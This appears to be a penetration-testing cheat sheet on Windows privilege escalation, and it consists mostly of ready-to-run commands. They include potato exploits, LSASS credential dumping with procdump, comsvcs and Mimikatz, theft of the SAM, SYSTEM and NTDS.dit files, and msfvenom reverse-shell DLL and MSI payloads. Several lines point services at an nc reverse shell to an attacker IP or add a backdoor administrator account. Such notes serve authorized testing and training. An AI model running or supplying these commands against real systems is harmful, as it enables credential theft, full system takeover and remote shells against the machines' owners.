+++
title = "Windows Privilege Escalation"
date = "2026-05-05T00:00:00-05:00"
tags = ["windows", "privesc", "privilege-escalation", "active-directory"]
description = "Windows privesc enumeration, token privileges (SeImpersonate, SeDebug), and group-based escalation (DnsAdmin, Backup Operators, Server Operators)."
draft = false
+++

## Initial Enumeration

```powershell
# Who am I
whoami /all          # user, groups, and privileges
whoami /priv         # token privileges only
whoami /groups       # group memberships

# System info
systeminfo
hostname
echo %COMPUTERNAME% %USERNAME% %USERDOMAIN%

# Network
ipconfig /all
route print
netstat -ano

# Running services
net start
sc query type= all state= all
tasklist /svc

# Installed software
wmic product get name,version
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | select DisplayName,DisplayVersion
```

---

## Token Privileges

### SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege

Present on service accounts (IIS, MSSQL, etc.). Use a potato exploit to impersonate SYSTEM.

```powershell
# Check
whoami /priv | findstr Impersonate

# JuicyPotato (pre-Windows 10 1809 / Server 2019)
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}

# PrintSpoofer (Windows 10 / Server 2019+)
PrintSpoofer.exe -i -c cmd

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"

# RoguePotato
RoguePotato.exe -r <attacker-ip> -e "cmd.exe" -l 9999
```

### SeDebugPrivilege

Allows attaching to any process — dump LSASS for credentials.

```powershell
# Check
whoami /priv | findstr Debug

# Dump LSASS (needs SeDebug)
# Method 1 — Task Manager: right-click lsass.exe → Create dump file
# Method 2 — procdump
procdump.exe -ma lsass.exe lsass.dmp

# Method 3 — comsvcs.dll
tasklist | findstr lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <lsass-PID> C:\lsass.dmp full

# Parse dump offline
pypykatz lsa minidump lsass.dmp
# or: Mimikatz → sekurlsa::minidump lsass.dmp → sekurlsa::logonpasswords
```

### SeTakeOwnershipPrivilege

Take ownership of any file or object.

```powershell
# Check
whoami /priv | findstr Ownership

# Take ownership of a file
takeown /f C:\path\to\file

# Grant yourself full control
icacls C:\path\to\file /grant %username%:F

# Common targets: SAM, SYSTEM hive, sensitive configs
takeown /f C:\Windows\System32\config\SAM
icacls C:\Windows\System32\config\SAM /grant %username%:F
copy C:\Windows\System32\config\SAM C:\temp\
copy C:\Windows\System32\config\SYSTEM C:\temp\
# Then: impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

---

## Group-Based Escalation

### DnsAdmins

Members can load a DLL as SYSTEM via the DNS service.

```bash
# Create malicious DLL (on attacker)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f dll -o exploit.dll

# Or: add user to local admins
msfvenom -p windows/x64/exec CMD='net user hacker Pass123! /add && net localgroup administrators hacker /add' -f dll -o exploit.dll

# Host the DLL
python3 -m http.server 80
# or: impacket-smbserver share . -smb2support
```

```powershell
# On target (as DnsAdmins member)
dnscmd /config /serverlevelplugindll \\<attacker-ip>\share\exploit.dll

# Restart DNS service (requires dns-server group or admin)
sc stop dns
sc start dns

# If you can't restart: wait for scheduled restart, or
net stop dns && net start dns
```

### Backup Operators

Can back up / restore any file — bypasses DACL. Use to read SAM/SYSTEM hive.

```powershell
# Check membership
net localgroup "Backup Operators"

# Must enable SeBackupPrivilege and SeRestorePrivilege in token
# Use: https://github.com/giuliano108/SeBackupPrivilege

Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll
Set-SeBackupPrivilege

# Copy protected files
Copy-FileSeBackupPrivilege C:\Windows\System32\config\SAM C:\temp\SAM
Copy-FileSeBackupPrivilege C:\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# Or use diskshadow + robocopy to grab NTDS.dit (DC)
diskshadow.exe
  set context persistent nowriters
  add volume c: alias dc_shadow
  create
  expose %dc_shadow% z:
  exit

robocopy /b z:\Windows\NTDS . ntds.dit
```

### Server Operators

Can start/stop services and write to service binary paths.

```powershell
# Check membership
net localgroup "Server Operators"

# List services the account can modify
sc qc <service>

# Change service binary path to reverse shell
sc config <service> binPath= "C:\temp\nc.exe <attacker-ip> 443 -e cmd.exe"
sc stop <service>
sc start <service>

# Or: replace the binary directly if writable
copy /y shell.exe C:\path\to\service.exe
net stop <service> && net start <service>
```

### Print Operators

Can load kernel drivers when `SeLoadDriverPrivilege` is present.

```powershell
whoami /priv | findstr SeLoadDriver

# Capcom driver exploit → SYSTEM
# Ref: https://github.com/tandasat/ExploitCapcom
```

### Event Log Readers

Can read security event logs — useful for credential harvesting.

```powershell
wevtutil qe Security /f:text | Select-String -Pattern "password|credential|4624|4625"
```

---

## Unquoted Service Paths

```powershell
# Find unquoted service paths with spaces
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /v "c:\windows\\" | findstr /v """

# If C:\Program Files\Vuln Service\app.exe is unquoted:
# Windows tries: C:\Program.exe, C:\Program Files\Vuln.exe, etc.
# Place malicious binary at the earliest writable location
copy shell.exe "C:\Program Files\Vuln.exe"
sc stop "VulnService" && sc start "VulnService"
```

---

## AlwaysInstallElevated

```powershell
# Check registry
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both must be 1

# Generate MSI payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f msi -o evil.msi

# Execute
msiexec /quiet /qn /i evil.msi
```

---

## Useful Tools

```powershell
# WinPEAS — automated enumeration
.\winPEASx64.exe

# PowerUp — PowerShell privesc checks
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt — security configuration survey
.\Seatbelt.exe -group=all
```
